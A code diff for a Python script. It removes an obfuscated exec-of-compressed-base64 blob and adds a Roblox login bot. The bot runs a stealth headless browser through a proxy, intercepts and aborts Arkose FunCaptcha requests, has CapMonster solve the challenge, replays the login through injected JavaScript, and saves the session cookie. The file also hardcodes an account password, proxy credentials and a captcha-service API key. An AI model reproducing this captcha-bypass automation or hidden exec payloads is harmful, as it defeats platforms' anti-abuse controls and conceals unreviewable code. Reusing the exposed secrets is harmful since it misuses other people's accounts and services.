@@ -1,2 +1,249 @@
-import zlib,base64
-exec(zlib.decompress(base64.b64decode(b"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")).decode("utf-8"))
+import os
+import sys
+
+# ==========================================
+# 🧠 SISTEMA DE AUTO-INSTALAÇÃO (BOOTSTRAP)
+# ==========================================
+if "--ubuntu-run" not in sys.argv and "com.termux" in sys.executable:
+    print("🚀 [SISTEMA] Rodando no Termux! Verificando ambiente e pulando pro Ubuntu...")
+    os.system("command -v proot-distro > /dev/null 2>&1 || (pkg update -y && pkg install proot-distro -y)")
+    os.system("proot-distro install ubuntu > /dev/null 2>&1")
+
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    nome_script = os.path.basename(__file__)
+
+    sh_temp = os.path.join(script_dir, ".run_ubuntu_temp.sh")
+    comando_ubuntu = f"""#!/bin/bash
+export DEBIAN_FRONTEND=noninteractive
+if ! command -v python3 > /dev/null 2>&1; then
+    apt-get update -y && apt-get install python3 python3-pip -y;
+fi
+if ! python3 -c 'import patchright' > /dev/null 2>&1; then
+    pip3 install patchright requests --break-system-packages && python3 -m patchright install chromium;
+fi
+cd /app
+python3 {nome_script} --ubuntu-run
+"""
+    with open(sh_temp, "w") as f:
+        f.write(comando_ubuntu)
+    os.system(f"chmod +x {sh_temp}")
+    os.system(f"proot-distro login ubuntu --bind '{script_dir}:/app' -- bash /app/.run_ubuntu_temp.sh")
+
+    if os.path.exists(sh_temp):
+        os.remove(sh_temp)
+    sys.exit()
+
+# ==========================================
+# 🤖 IMPORTS DO BOT (SÓ RODAM DENTRO DO UBUNTU)
+# ==========================================
+import time, json, requests, re, base64
+from urllib.parse import unquote
+from patchright.sync_api import sync_playwright
+
+USER = "Alaquelegalz4"
+PASS = "willianz4z4oof$"
+COOKIE_FILE = "cookies.json"
+CM_KEY = "35e32346fa20ab9dfa29b14e7809de2d"
+ALVO_URL = "https://www.roblox.com/login"
+
+USAR_PROXY = True 
+
+PROXY_HOST = "gw.dataimpulse.com"
+PROXY_PORT = 823
+PROXY_USER = "66f8168c3d63dc0d5abd"
+PROXY_PASS = "22a2f596131de837"
+USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
+
+dados_capturados = {
+    "blob": None,
+    "pk": None,
+    "surl": None,
+    "challenge_id": None
+}
+
+def interceptador_rede(route):
+    request = route.request
+    if "fc/gt2/public_key/" in request.url and request.method == "POST":
+        print(f"\n[🚨 ALARME DE REDE] Requisição Arkose interceptada!")
+        try:
+            partes_url = request.url.split('/')
+            dados_capturados['pk'] = partes_url[-1]
+            match_surl = re.search(r'https?://([^/]+)', request.url)
+            if match_surl:
+                dados_capturados['surl'] = match_surl.group(1)
+
+            payload_bruto = request.post_data
+            if payload_bruto:
+                match_blob = re.search(r'(?:data(?:%5B|\[)blob(?:%5D|\])|blob)=([^&]+)', payload_bruto)
+                if match_blob:
+                    blob_limpo = unquote(match_blob.group(1)).replace(' ', '+')
+                    dados_capturados['blob'] = blob_limpo
+                    print(f"[🔥 BINGO] Blob extraído! Tamanho: {len(blob_limpo)}")
+        except Exception as e:
+            print(f"[-] Erro no interceptador: {e}")
+        route.abort()
+    else:
+        route.continue_()
+
+def captura_challenge(response):
+    if "v2/login" in response.url and response.status == 403:
+        chal_id = response.headers.get("rblx-challenge-id")
+        if chal_id:
+            dados_capturados['challenge_id'] = chal_id
+            print(f"\n[🔥] Challenge ID capturado: {chal_id}")
+
+def solve(blob, pk, surl):
+    print(f"[*] Montando Payload pro CapMonster...")
+    task_data = {
+        'type': 'FunCaptchaTaskProxyless' if not USAR_PROXY else 'FunCaptchaTask',
+        'websiteURL': ALVO_URL,
+        'websitePublicKey': pk,
+        'userAgent': USER_AGENT
+    }
+
+    if USAR_PROXY:
+        task_data.update({
+            'proxyType': 'http', 'proxyAddress': PROXY_HOST,
+            'proxyPort': PROXY_PORT, 'proxyLogin': PROXY_USER, 'proxyPassword': PROXY_PASS,
+        })
+
+    if surl: task_data['funcaptchaApiJSSubdomain'] = surl
+    if blob: task_data['data'] = json.dumps({'blob': blob})
+
+    try:
+        t_res = requests.post('https://api.capmonster.cloud/createTask', json={'clientKey': CM_KEY, 'task': task_data}, timeout=20).json()
+    except Exception:
+        return None
+
+    t = t_res.get('taskId')
+    if not t: return None
+    print(f"[*] Task ID: {t}. Aguardando resolução...")
+
+    tentativas = 1
+    while tentativas <= 80:
+        time.sleep(3)
+        try:
+            res = requests.post('https://api.capmonster.cloud/getTaskResult', json={'clientKey': CM_KEY, 'taskId': t}, timeout=20).json()
+        except: continue
+
+        if res.get('errorId', 0) > 0: return None
+        status = res.get('status')
+        print(f"[*] [Tempo: {tentativas * 3}s] Status: {status}")
+
+        if status == 'ready':
+            print("\n✅ [+] CAPTCHA RESOLVIDO!")
+            return res.get('solution', {}).get('token')
+        tentativas += 1
+    return None
+
+with sync_playwright() as p:
+    args_stealth = ['--disable-blink-features=AutomationControlled', '--no-sandbox', '--disable-setuid-sandbox', '--window-size=1280,720', '--disable-web-security']
+    print("\n[+] Iniciando Navegador...")
+    
+    b = p.chromium.launch(headless=True, args=args_stealth, proxy={'server': f'http://{PROXY_HOST}:{PROXY_PORT}', 'username': PROXY_USER, 'password': PROXY_PASS})
+    c = b.new_context(user_agent=USER_AGENT, viewport={'width': 1280, 'height': 720})
+    page = c.new_page()
+    
+    page.route("**/*", interceptador_rede)
+    page.on("response", captura_challenge)
+
+    MAX_RETRIES = 5
+    for tentativa_atual in range(1, MAX_RETRIES + 1):
+        dados_capturados['blob'] = None
+        dados_capturados['pk'] = None
+        dados_capturados['challenge_id'] = None
+
+        print(f"\n==============================================")
+        print(f"🚀 [RODADA {tentativa_atual}/{MAX_RETRIES}] Tentando autenticação...")
+        print(f"==============================================")
+
+        try:
+            page.goto(ALVO_URL, wait_until="domcontentloaded", timeout=60000)
+            page.fill('input#login-username', USER)
+            time.sleep(1)
+            page.fill('input#login-password', PASS)
+            time.sleep(1)
+
+            page.click('button#login-button', delay=200, force=True)
+
+            for _ in range(40):
+                page.wait_for_timeout(1000)
+                if dados_capturados['blob'] and dados_capturados['challenge_id']:
+                    break
+
+            if dados_capturados['blob'] and dados_capturados['pk'] and dados_capturados['challenge_id']:
+                token = solve(dados_capturados['blob'], dados_capturados['pk'], dados_capturados['surl'])
+
+                if token:
+                    print("\n[+] Enviando resposta do desafio para a API...")
+                    
+                    # Formata os metadados do desafio em Base64
+                    metadata_raw = json.dumps({
+                        "unifiedCaptchaId": dados_capturados['challenge_id'],
+                        "captchaToken": token,
+                        "actionType": "Generic"
+                    })
+                    metadata_b64 = base64.b64encode(metadata_raw.encode()).decode()
+
+                    ataque_api_js = f"""
+                    (async () => {{
+                        let payload = {{
+                            ctype: "Username",
+                            cvalue: "{USER}",
+                            password: "{PASS}"
+                        }};
+                        
+                        let csrf = document.querySelector('meta[name="csrf-token"]')?.content || '';
+                        
+                        let headers = {{
+                            "Content-Type": "application/json",
+                            "X-CSRF-TOKEN": csrf,
+                            "rblx-challenge-id": "{dados_capturados['challenge_id']}",
+                            "rblx-challenge-type": "captcha",
+                            "rblx-challenge-metadata": "{metadata_b64}"
+                        }};
+                        
+                        let res = await fetch("https://auth.roblox.com/v2/login", {{
+                            method: "POST",
+                            headers: headers,
+                            body: JSON.stringify(payload),
+                            credentials: "include"
+                        }});
+                        
+                        if (res.status === 403 && res.headers.has('x-csrf-token')) {{
+                            headers["X-CSRF-TOKEN"] = res.headers.get('x-csrf-token');
+                            res = await fetch("https://auth.roblox.com/v2/login", {{
+                                method: "POST",
+                                headers: headers,
+                                body: JSON.stringify(payload),
+                                credentials: "include"
+                            }});
+                        }}
+                        
+                        return await res.json();
+                    }})()
+                    """
+                    
+                    resposta_api = page.evaluate(ataque_api_js)
+                    print(f"\n[📡] RESPOSTA DO SERVIDOR: {resposta_api}")
+                    
+                    time.sleep(3)
+                    cookies = c.cookies()
+                    cookies_str = json.dumps(cookies)
+
+                    if ".ROBLOSECURITY" in cookies_str or "twoStepVerificationData" in json.dumps(resposta_api) or "user" in resposta_api:
+                        with open(COOKIE_FILE, 'w') as f:
+                            json.dump(cookies, f)
+                        print(f"\n✅ [SUCESSO] Sessão autenticada! Cookie salvo em: {COOKIE_FILE}")
+                        b.close()
+                        sys.exit(0)
+                    else:
+                        print("\n[-] Falha ao autenticar com o token fornecido.")
+
+        except Exception as e:
+            print(f"[-] Erro na execução: {e}")
+        
+        time.sleep(3)
+
+    b.close()
+    print("\n[+] Script Finalizado.")
